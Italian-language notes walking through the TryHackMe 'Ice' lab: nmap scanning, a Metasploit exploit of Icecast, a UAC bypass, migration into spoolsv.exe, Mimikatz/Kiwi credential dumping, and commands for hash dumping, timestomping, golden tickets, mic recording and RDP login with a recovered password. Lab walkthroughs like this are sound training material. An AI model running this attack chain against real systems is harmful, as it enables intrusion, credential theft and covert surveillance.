
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/ice

```
sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.33.87 -oG risultatoscan
```

```
135,139,445,3389,5357,8000,49152,49154,49158,49159
```

```
sudo nmap -sC -sV -PN -p135,139,445,3389,5357,8000,49152,49154,49158,49159 10.10.212.94 -oN risultatoscan2
```
-Pn perchè il server blocca il pin

Una delle porte più interessanti aperte è Microsoft Remote Desktop (MSRDP) 3389

```
sudo nmap -sV -Pn -p 8000 10.10.212.94
```
servizio:Icecast

```
nmap -A -Pn 10.10.212.94
```
hostname:DARK-PC
icecast vulnerabile  [CVE-2004-1561](https://www.cvedetails.com/cve/CVE-2004-1561/ "CVE-2004-1561 security vulnerability details")

```
msfconsole
```

```
search icecast
```

```
use 0
```

```
show options
```

```
set RHOSTS 10.10.33.87
```

```
set LHOST 10.21.9.220
```

```
exploit
```

```
getuid 
```
(darmi user id tipo whoami) da meterpreter
Server username: Dark-PC\Dark
utente è Dark

==ps== lista dei processi in esecuzione
```
ps
```
==sysinfo== info di sistema
```
sysinfo
```
 ==local exploit suggester== restituirà un bel po' di risultati per potenziali exploit di escalation
```
run post/multi/recon/local_exploit_suggester
```
exploit/windows/local/bypassuac_eventvwr

Ora che abbiamo in mente un exploit per elevare i nostri privilegi, mettiamo in background la nostra sessione corrente usando il comando `background` o `CTRL + z`. Prendi nota del numero di sessione che abbiamo, in questo caso sarà probabilmente 1. Possiamo elencare tutte le nostre sessioni attive usando il comando `sessions` quando siamo fuori dalla shell meterpreter.

```
sessions
```
1 (la sessione che abbiamo è la 1)

Procediamo e selezioniamo il nostro exploit locale trovato in precedenza per utilizzarlo utilizzando il comando `use FULL_PATH_FOR_EXPLOIT`

```
use exploit/windows/local/bypassuac_eventvwr
```

Gli exploit locali richiedono che venga selezionata una sessione (cosa che possiamo verificare con il comando `show options`),

```
show options
```

impostala ora usando il comando `set session SESSION_NUMBER`
 `
```
 set session 1
```
impostata la sessione dove eseguire exploit

```
ip addr
```

```
set LHOST 10.21.9.220
```

```
run
```

Ora possiamo verificare di aver ampliato i permessi usando il comando `getprivs`. 
```
getprivs
```
==permesso che ci consente di prendere possesso dei file==
```
SeTakeOwnershipPrivilege
```

Prima di procedere ulteriormente, dobbiamo passare a un processo che abbia effettivamente i permessi di cui abbiamo bisogno per interagire con il servizio lsass, il servizio responsabile dell'autenticazione in Windows. Per prima cosa, elenchiamo i processi usando il comando `ps`. Nota, possiamo vedere i processi eseguiti da NT AUTHORITY\SYSTEM poiché abbiamo aumentato i permessi (anche se il nostro processo non li ha).

```
ps
```

Per interagire con ==lsass== dobbiamo "living in" in ==un processo che abbia la stessa architettura del servizio lsass== (x64 nel caso di questa macchina==) e un processo che abbia le stesse autorizzazioni di lsass.== Il servizio di ==spool della stampante soddisfa perfettamente le nostre esigenze== per questo e si riavvia se lo blocchiamo! Come si chiama il servizio della stampante?
```
spoolsv.exe
```

In questa domanda è menzionato il termine "living in" un processo. Spesso quando prendiamo il controllo di un programma in esecuzione, alla fine carichiamo un'altra libreria condivisa nel programma (una dll) che include il nostro codice dannoso. Da questo, possiamo generare un nuovo thread che ospita la nostra shell.

Esegui la migrazione a questo processo ora con il comando `migrate -N PROCESS_NAME`

```
migrate -N spoolsv.exe
```
Controlliamo ora che utente siamo con il comando `getuid`. 
```
getuid
```
Quale utente è elencato?
```
erver username: NT AUTHORITY\SYSTEM
```
Ora che abbiamo raggiunto i permessi di amministratore completi, ci concentreremo sul saccheggio. 
==Mimikatz== è uno ==strumento di dumping delle password piuttosto infame==, incredibilmente utile. 
Caricalo ora usando il comando `load kiwi` (Kiwi è la versione aggiornata di Mimikatz)

meterpreter > load kiwi
```
load kiwi
```

```
help
```

Quale comando consente di recuperare tutte le credenziali?

```
creds_all
```

Esegui questo comando ora. Qual è la password di Dark?  
```
Password01!
```

Mimikatz ci consente di rubare questa password dalla memoria anche senza che l'utente 'Dark' abbia effettuato l'accesso, poiché c'è un'attività pianificata che esegue Icecast come utente 'Dark'. Aiuta anche il fatto che Windows Defender non sia in esecuzione sulla casella ;) (Dai un'altra occhiata all'elenco ps, questa casella non è nelle migliori condizioni con sia il firewall che il defender disabilitati)

Prima di iniziare il nostro post-sfruttamento, rivisitiamo un'ultima volta il menu di aiuto nella shell meterpreter. Risponderemo alle seguenti domande usando quel menu.

Quale ==comando ci consente di scaricare tutti gli hash delle password memorizzati sul sistema==? 
```
hashdump
```

Quale ==comando==, sebbene più utile quando si interagisce con una macchina in uso, ==ci consente di osservare il desktop dell'utente remoto in tempo reale==?

```
screenshare
```

E se volessimo ==registrare da un microfono collegato al sistema==?

```
record_mic
```

==Per complicare gli sforzi di analisi forense, possiamo modificare i timestamp dei file sul sistema.== 
Quale comando ci consente di farlo? 
```
timestomp
```

Non farlo mai su un pentest, a meno che non ti venga esplicitamente consentito! Questo non è utile al team di difesa, in quanto cerca di analizzare gli eventi del pentest dopo il fatto.

==Mimikatz ci consente di creare quello che viene chiamato un `golden ticket`, che ci consente di autenticarci ovunque con facilità==. Quale comando ci consente di farlo?
```
golden_ticket_create
```
Gli ==attacchi golden ticket== sono una funzione all'interno di Mimikatz che abusa di un componente di Kerberos (il sistema di autenticazione nei domini Windows), il ticket di concessione ticket. In breve, gli attacchi golden ticket ci consentono di ==mantenere la persistenza e di autenticarci come qualsiasi utente sul dominio.==

Un'ultima cosa da notare. Poiché abbiamo la password per l'utente 'Dark', ora ==possiamo autenticarci sulla macchina e accedervi tramite desktop remoto (MSRDP).== Poiché si tratta di una workstation, probabilmente espelleremmo qualsiasi utente vi abbia effettuato l'accesso se ci connettessimo ad essa, tuttavia, è sempre interessante accedere da remoto alle macchine e visualizzarle come le vedono i loro utenti. Se questa opzione non è già stata abilitata, possiamo abilitarla tramite il seguente modulo Metasploit:  `run post/windows/manage/enable_rdp`

```
run post/windows/manage/enable_rdp
```

```
xfreerdp /u:RELEVANT\Dark /p:'Password01!' /v:10.10.33.87:8000
```





